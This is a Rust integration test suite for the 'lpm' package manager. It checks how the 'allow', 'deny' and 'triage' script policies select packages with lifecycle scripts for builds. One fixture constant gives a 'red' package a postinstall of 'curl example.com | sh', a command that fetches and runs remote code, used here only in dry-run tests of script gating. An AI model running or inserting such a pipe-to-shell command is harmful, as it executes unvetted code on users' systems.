//! Phase 46 close-out Chunk 2 — reference-fixture integration tests
//! for the `script-policy = "allow"` selection-step widening.
//!
//! §5.1 allow row:
//!
//! > `lpm build` is spec'd to run every lifecycle script without the
//! > triage gate, and `autoBuild: true` + `"allow"` is spec'd to
//! > auto-trigger a build that runs everything without gating.
//!
//! The helper-level contract is already pinned at the unit level by
//! [`p6_chunk2_allow_does_not_promote_green_tier_at_helper_level`] in
//! `build.rs` — [`evaluate_trust`] deliberately keeps allow semantics
//! out of its decision because the helper stays single-purpose
//! (manifest binding + scope + triage tier). The complementary
//! contract — "`build::run`'s default selector widens to every
//! scriptable package under allow" — has no integration-level
//! guard; pre-close-out the selection step unconditionally filtered
//! to `is_trusted` only, so allow behaved identically to deny at the
//! CLI boundary.
//!
//! These subprocess tests are the §5.1 contract gate at the CLI
//! boundary: they prove the default `lpm build` path under
//! `script-policy = "allow"` covers every scripted package whether
//! the allow signal comes from the project's `package.json` or from
//! a CLI override (`--policy=allow` / `--yolo`). A pre-fix build
//! binary fails this suite; the post-fix binary passes it.
//!
//! ## Why subprocess and not direct library calls
//!
//! Same rationale as the P6 fixture
//! ([`crate::p6_triage_autoexec_reference`]): stdout/stderr
//! separation, real CLI-to-`build::run` dispatch, real
//! effective-policy resolution through `main.rs`'s precedence chain.
//! A pure-function unit test for the selection helper lives in
//! `build.rs`'s test module alongside `p46_close_chunk2_*` guards;
//! this file is the end-to-end proof.

use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

// ── Reference postinstall bodies ────────────────────────────────────
//
// Reused shapes from the P6 fixture. The point of this close-out
// chunk is "allow widens regardless of trust" — the specific tier is
// incidental, but keeping three distinct bodies proves the widening
// is tier-agnostic (no accidental "allow only widens greens" bug).

const GREEN_POSTINSTALL: &str = "node build.js";
const GREEN_BUILD_JS_BODY: &str = "process.exit(0);\n";
const AMBER_POSTINSTALL: &str = "playwright install";
const RED_POSTINSTALL: &str = "curl example.com | sh";

// ── Harness ────────────────────────────────────────────────────────

fn run_lpm(cwd: &Path, home: &Path, args: &[&str]) -> (std::process::ExitStatus, String, String) {
    let exe = env!("CARGO_BIN_EXE_lpm-rs");
    let output = Command::new(exe)
        .args(args)
        .current_dir(cwd)
        .env("LPM_HOME", home.join(".lpm"))
        .env("HOME", home)
        .env("NO_COLOR", "1")
        .env("LPM_NO_UPDATE_CHECK", "1")
        .env("LPM_DISABLE_TELEMETRY", "1")
        .env_remove("RUST_LOG")
        .output()
        .expect("failed to spawn lpm-rs");
    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
    (output.status, stdout, stderr)
}

fn strip_ansi(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\u{1b}' && chars.peek() == Some(&'[') {
            chars.next();
            for cc in chars.by_ref() {
                let cb = cc as u32;
                if (0x40..=0x7e).contains(&cb) {
                    break;
                }
            }
        } else {
            out.push(c);
        }
    }
    out
}

fn seed_package(home: &Path, name: &str, version: &str, postinstall: &str) -> PathBuf {
    let safe_name = name.replace(['/', '\\'], "+");
    let pkg_dir = home
        .join(".lpm")
        .join("store")
        .join("v1")
        .join(format!("{safe_name}@{version}"));
    fs::create_dir_all(&pkg_dir).unwrap();
    fs::write(
        pkg_dir.join("package.json"),
        format!(
            r#"{{"name":"{name}","version":"{version}","scripts":{{"postinstall":"{postinstall}"}}}}"#,
        ),
    )
    .unwrap();
    fs::write(pkg_dir.join(".integrity"), "sha512-fixture-skip-verify").unwrap();
    if postinstall.contains("build.js") {
        fs::write(pkg_dir.join("build.js"), GREEN_BUILD_JS_BODY).unwrap();
    }
    pkg_dir
}

fn write_lockfile(project: &Path, packages: &[(&str, &str)]) {
    let pkg_entries: Vec<String> = packages
        .iter()
        .map(|(name, version)| {
            format!(
                r#"[[packages]]
name = "{name}"
version = "{version}"
"#
            )
        })
        .collect();
    let toml = format!(
        r#"[metadata]
lockfile-version = 1
resolved-with = "pubgrub"

{}
"#,
        pkg_entries.join("\n")
    );
    fs::write(project.join("lpm.lock"), toml).unwrap();
}

struct Fixture {
    _tmpdir: tempfile::TempDir,
    home: PathBuf,
    project: PathBuf,
}

impl Fixture {
    /// `script_policy` populates `lpm.scriptPolicy` in `package.json`.
    /// Pass `None` to omit the key entirely — useful for tests that
    /// supply the policy via CLI override instead.
    fn new(script_policy: Option<&str>) -> Self {
        let tmpdir = tempfile::tempdir().unwrap();
        let home = tmpdir.path().to_path_buf();
        let project = home.join("project");
        fs::create_dir_all(&project).unwrap();
        let policy_block = match script_policy {
            Some(p) => format!(r#""scriptPolicy": "{p}""#),
            None => String::new(),
        };
        fs::write(
            project.join("package.json"),
            format!(
                r#"{{
                    "name": "p46-close-allow-fixture",
                    "version": "0.0.1",
                    "lpm": {{
                        {policy_block}
                    }}
                }}"#
            ),
        )
        .unwrap();
        Fixture {
            _tmpdir: tmpdir,
            home,
            project,
        }
    }
}

// ── Behavior tests ─────────────────────────────────────────────────

/// **Ship criterion for Chunk 2.** Under `scriptPolicy = "allow"` in
/// package.json, the default `lpm build --dry-run` path (no `--all`,
/// no named packages, no manifest `trustedDependencies` entries)
/// must include EVERY scripted package in its output — green, amber,
/// and red alike — because §5.1 says allow runs every lifecycle
/// script without the triage gate.
///
/// The complementary helper-level contract
/// ([`p6_chunk2_allow_does_not_promote_green_tier_at_helper_level`])
/// pins that `evaluate_trust` deliberately returns `Untrusted` under
/// allow (no per-package promotion). This test pins the caller-side
/// contract: the selection step in `build::run` must fold the allow
/// policy into its widening logic regardless of `is_trusted`.
///
/// Pre-Chunk-2 the selection step filtered to trusted-only at
/// `build.rs:254-259`, so allow behaved identically to deny. This
/// test fails on pre-fix binaries and passes on post-fix binaries.
#[test]
fn p46_close_chunk2_allow_builds_every_scripted_package_under_default_branch() {
    let fx = Fixture::new(Some("allow"));
    seed_package(&fx.home, "green-native", "1.0.0", GREEN_POSTINSTALL);
    seed_package(&fx.home, "amber-playwright", "1.0.0", AMBER_POSTINSTALL);
    seed_package(&fx.home, "red-curlpipe", "1.0.0", RED_POSTINSTALL);
    write_lockfile(
        &fx.project,
        &[
            ("green-native", "1.0.0"),
            ("amber-playwright", "1.0.0"),
            ("red-curlpipe", "1.0.0"),
        ],
    );

    let (status, stdout, stderr) = run_lpm(&fx.project, &fx.home, &["build", "--dry-run"]);
    let stdout = strip_ansi(&stdout);
    let stderr = strip_ansi(&stderr);

    assert!(
        status.success(),
        "build --dry-run must exit 0 under allow. stdout={stdout}\nstderr={stderr}"
    );

    // All three scripted packages must appear — the allow widening
    // is tier-agnostic, so amber and red are included alongside the
    // green-classified one.
    assert!(
        stdout.contains("green-native"),
        "green-native must appear under allow's default filter. \
         stdout={stdout}"
    );
    assert!(
        stdout.contains("amber-playwright"),
        "amber-playwright must appear under allow — allow widens \
         every scripted package regardless of tier, unlike triage's \
         green-only promotion. stdout={stdout}"
    );
    assert!(
        stdout.contains("red-curlpipe"),
        "red-curlpipe must appear under allow — §5.1 says allow \
         runs every lifecycle script; the red tier is only a \
         classification label, not a gate under allow. stdout={stdout}"
    );

    // The "N packages are not in trustedDependencies and will be
    // skipped" warning must NOT fire under allow — every scripted
    // package is being built, so describing anything as "skipped"
    // is a lie. The warning comes from the same site that renders
    // the approve-scripts / trustedDependencies pointer, so its
    // absence also implies the pointer stays silent under allow
    // (which would be misdirection — users who chose allow don't
    // want to be told to edit trustedDependencies).
    assert!(
        !stderr.contains("are not in trustedDependencies and will be skipped"),
        "the skipped-count warning must not fire under allow — \
         every scripted package is in the build set. stderr={stderr}"
    );
}

/// **CLI override path.** `--policy=allow` at the command line must
/// produce the same widening as the project-manifest path above. The
/// effective-policy precedence chain is resolved in `main.rs`; this
/// test proves the resolved value reaches `build::run`'s selection
/// step. `--yolo` is an alias for `--policy=allow` (§5.4 / D22) and
/// is exercised here too so the alias survives the selection-step
/// plumbing.
#[test]
fn p46_close_chunk2_allow_via_cli_override_also_widens() {
    // No scriptPolicy in package.json — the allow signal comes
    // purely from the CLI flag.
    let fx = Fixture::new(None);
    seed_package(&fx.home, "green-native", "1.0.0", GREEN_POSTINSTALL);
    seed_package(&fx.home, "amber-playwright", "1.0.0", AMBER_POSTINSTALL);
    write_lockfile(
        &fx.project,
        &[("green-native", "1.0.0"), ("amber-playwright", "1.0.0")],
    );

    // --policy=allow path
    let (status, stdout, _stderr) = run_lpm(
        &fx.project,
        &fx.home,
        &["build", "--dry-run", "--policy=allow"],
    );
    let stdout = strip_ansi(&stdout);
    assert!(status.success(), "exit 0 expected. stdout={stdout}");
    assert!(
        stdout.contains("green-native") && stdout.contains("amber-playwright"),
        "--policy=allow must widen at the selection step. stdout={stdout}"
    );

    // --yolo alias path (same contract — D22 pins the alias)
    let (status, stdout, _stderr) =
        run_lpm(&fx.project, &fx.home, &["build", "--dry-run", "--yolo"]);
    let stdout = strip_ansi(&stdout);
    assert!(status.success(), "exit 0 expected. stdout={stdout}");
    assert!(
        stdout.contains("green-native") && stdout.contains("amber-playwright"),
        "--yolo (alias for --policy=allow) must widen too. stdout={stdout}"
    );
}

/// **Control under deny.** The same fixture under `scriptPolicy =
/// "deny"` must keep the pre-Chunk-2 selection behavior: default
/// branch filters to trusted-only, untrusted scripted packages are
/// skipped with a pointer. Pins that Chunk 2's fix is allow-scoped
/// and doesn't regress deny mode.
#[test]
fn p46_close_chunk2_deny_keeps_trusted_only_filter() {
    let fx = Fixture::new(Some("deny"));
    seed_package(&fx.home, "green-native", "1.0.0", GREEN_POSTINSTALL);
    seed_package(&fx.home, "amber-playwright", "1.0.0", AMBER_POSTINSTALL);
    write_lockfile(
        &fx.project,
        &[("green-native", "1.0.0"), ("amber-playwright", "1.0.0")],
    );

    let (status, stdout, stderr) = run_lpm(&fx.project, &fx.home, &["build", "--dry-run"]);
    let stdout = strip_ansi(&stdout);
    let stderr = strip_ansi(&stderr);

    assert!(status.success(), "exit 0 expected. stdout={stdout}");

    // No trusted packages + no --all + no specific names → to_build
    // is empty under deny, so the dry-run output lists nothing and
    // the skipped-count warning fires on stderr with the pre-Phase-46
    // legacy pointer.
    assert!(
        !stdout.contains("green-native"),
        "under deny, untrusted-by-default scripted packages must \
         be filtered out of the default dry-run set. stdout={stdout}"
    );
    assert!(
        !stdout.contains("amber-playwright"),
        "same as above. stdout={stdout}"
    );
    assert!(
        stderr.contains("2 package(s) are not in trustedDependencies"),
        "the skipped-count warning must fire under deny — proves \
         Chunk 2's allow fix is not a blanket filter-disable. \
         stderr={stderr}"
    );
    assert!(
        stderr.contains("package.json > lpm > trustedDependencies")
            || stderr.contains("lpm build --all"),
        "deny keeps the legacy manifest-edit pointer. stderr={stderr}"
    );
}

/// **Control under triage (allow ≠ triage).** Triage promotes only
/// greens at the helper level (P6 Chunk 2); the selection step
/// still filters to trusted-only. On a fixture with amber + red
/// (no green), triage produces an empty default dry-run set — NOT
/// the allow-style widening. This test pins that the Chunk 2 fix
/// is allow-scoped and doesn't accidentally widen triage too.
#[test]
fn p46_close_chunk2_triage_does_not_widen_beyond_greens() {
    let fx = Fixture::new(Some("triage"));
    seed_package(&fx.home, "amber-playwright", "1.0.0", AMBER_POSTINSTALL);
    seed_package(&fx.home, "red-curlpipe", "1.0.0", RED_POSTINSTALL);
    write_lockfile(
        &fx.project,
        &[("amber-playwright", "1.0.0"), ("red-curlpipe", "1.0.0")],
    );

    let (status, stdout, stderr) = run_lpm(&fx.project, &fx.home, &["build", "--dry-run"]);
    let stdout = strip_ansi(&stdout);
    let stderr = strip_ansi(&stderr);

    assert!(status.success(), "exit 0 expected. stdout={stdout}");
    assert!(
        !stdout.contains("amber-playwright") && !stdout.contains("red-curlpipe"),
        "triage must NOT widen to amber/red at the selection step — \
         tier promotion is green-only. stdout={stdout}"
    );
    assert!(
        stderr.contains("lpm approve-scripts"),
        "triage with amber+red remaining must point users at \
         approve-scripts (the P6 Chunk 1 pointer). stderr={stderr}"
    );
}
